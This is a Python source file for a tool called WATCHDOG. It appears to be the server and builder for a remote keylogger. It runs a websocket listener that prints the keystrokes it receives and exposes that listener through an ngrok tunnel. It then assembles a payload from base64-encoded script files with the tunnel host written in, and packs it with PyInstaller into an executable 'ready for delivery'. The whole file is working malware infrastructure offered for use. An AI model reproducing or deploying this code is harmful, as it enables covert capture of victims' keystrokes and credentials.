from multiprocessing import Process
from base64 import b64decode
from tornado import web,websocket,ioloop
from pyngrok import ngrok
import configparser
from tornado.httpserver import HTTPServer
import PyInstaller.__main__
import os
import socket
import time
import re
from halo import Halo
#execute server
SMM_Spinner=Halo(text='Initializing WATCHDOG Server ...',text_color='cyan',spinner='dots')

def server_executre():
    SMM_Spinner.start()
    strokes=[]
    class WebSocket_Request_Handler(websocket.WebSocketHandler):
        def open(self):
            SMM_Spinner.info('[$WADOG:INFO]:=> Connection Established ')
        def on_message(self,message):
            strokes.append(message)
            SMM_Spinner.color='red'
            SMM_Spinner.info(''.join(strokes))
        def on_close(self):
            SMM_Spinner.info('[$WADOG:INFO]:=> Connection Closed by Remote App')


    
    def app():
        return web.Application(
                [(r'/websocket',WebSocket_Request_Handler)]
        )

    try:  
        server=HTTPServer(app())
        server.listen(8000)
        conf=configparser.ConfigParser()
        public_ip=ngrok.connect(8000)
        confile=open('PAYLOAD.ini','w')
        conf.add_section('HostSection')
        conf.set('HostSection','HOST',public_ip.replace('http://',''))
        conf.write(confile)
        confile.close()
        SMM_Spinner.info(f'[$WADOG:INFO]:=> WATCHDOG Listening on https://localhost:8000 Port Forwarded -> {public_ip} For Payload')
        ioloop.IOLoop.current().start()
    except KeyboardInterrupt :
        SMM_Spinner.warn('[$WADOG:INFO]:=> Server Killed By User')
#set section ngrok
def Payload_initializer(HOST):
    SMM_Spinner.info(f'[$WADOG:INFO]:=> initializing Paylod')
    file_creation=open('payload.py','w')
    file_creation.close()
    with open('IMPORTS','r') as imports:
        imports=imports.read()
        with open('SCRIPT','r') as script:
            script=script.read()
            with open('payload.py','a') as payload:
                payload.write(b64decode(imports).decode('UTF-8'))
                payload.write(f"""\nHOST='{HOST}'\n""")
                payload.write(b64decode(script).decode('UTF-8'))
    SMM_Spinner.info('[$WADOG:INFO]:=> building Paylod')         
    PyInstaller.__main__.run([
    '--onefile',
    # '--noconsole',
    '--icon=wadog.ico',
    os.path.join('payload.py')
    ])
    SMM_Spinner.info('[$WADOG:INFO]:=> Deleting cached Paylod File')  
    os.remove('payload.py')
    SMM_Spinner.color='green'
    SMM_Spinner.succeed('[$WADOG:INFO]:=> Payload Is Ready for delivery ')
    SMM_Spinner.color='blue'
    SMM_Spinner.info('[$WADOG:INFO]:=> Server Still Working on https://localhost:8000 :')  
    SMM_Spinner.info('''[$WADOG:INFO]: DOG IS LISTENING...
     |\_/|                  
     | @ @   Woof! 
     |   <>              _  
     |  _/\------____ ((| |))
     |               `--' |   
 ____|_       ___|   |___.' 
/_/_____/____/_______|
----------------
    ''')  


if __name__ == "__main__":
    SMM_Spinner=Halo(text='Initializing WATCHDOG Module...',text_color='green',spinner='dots')

    SMM_Spinner.succeed('''
.               _         _           _                         _     ___     ___  
 __      __ __ _ | |_  ___ | |__     __| |  ___    __ _  __   __ / |   / _ \   / _ \ 
 \ \ /\ / // _` || __|/ __|| '_ \   / _` | / _ \  / _` | \ \ / / | |  | | | | | | | |
  \ V  V /| (_| || |_| (__ | | | | | (_| || (_) || (_| |  \ V /  | | _| |_| |_| |_| |
   \_/\_/  \__,_| \__|\___||_| |_|  \__,_| \___/  \__, |   \_/   |_|(_)\___/(_)\___/ 
                                                  |___/                              
    
''')

    SMM_Spinner.succeed('''                       
.                                            ,d""7b.
                                           ,'    ,d^b.
                            __,d"""""""b..d.    d'
              ,d""""-.  ,d""'              `"b.dP
            dP' ,___  `7b.                     `b
          `"788P'  `".   "                       `b
          ,d" `b      `"                          `7.
    `P""""7.   8)                                   7.
     `.    8  ,P               ,---.                 """"b.
      8.  d' ,P             ,d"   ,88b.         "b       `8
     d' `"  ,P             ""    ,P   `7b        `b     ,dP
    d'      8                    d   O   `b.      d8888888888b.
   ,'      d'                   ,8.         78""""""788888888' `"b.
   8b _   8P                 ,P'   `"""oo.,d"          ""788'     `7.
 .-""""8 d8'            ,-""7P                       .    `7.      ,8.
`b     8 88              ,d"8   d8b.                 8b    `b      d `.
  `b___8 88             '  ,8  d8888888b.           ; `b    8     ,P  8.
   8     88                8  d8"7P""8""""b..      ,8  `b  ,8"""""8'  88
   8     `b ,d"'           7  8  8   8   ,8. 7P--,dP   ,8"'     ,8' _,d8.
   7.     8d"                 8 ,db.P""bd' `7P ,d""""""""""""""""""'    8
   `b     d'                  8P'  8   88  ,P"'                         8
    7. _,d'                   7b  ,d88888"'                            d'
    ,P' '8                     8888888"'                               8
   ,P   88                     `888P'                                  8
  ,8_mGk_8                       "'                                   d'
        "8                                                    ,'     d'
         `b                                                  d8b..d""
          `b                                              ,dP'
           `7.                           ______________,d""
             `7b.                     ,d""
                `7b..             _,d"'
                     """--....-"""'
    ''')
    start_time = time.time()
    try:
        p1=Process(target=server_executre)
        p1.start()
        time.sleep(7)
        conf=configparser.ConfigParser()
        conf.read('PAYLOAD.ini')
        conf.get('HostSection','HOST')
        p2=Process(target=Payload_initializer(conf.get('HostSection','HOST')))
        p2.start()
        p1.join()
        p2.join()
    except KeyboardInterrupt :
        SMM_Spinner.info(f'[$WADOG:INFO]:=> WATCHDOG finished in {time.time()-start_time}')
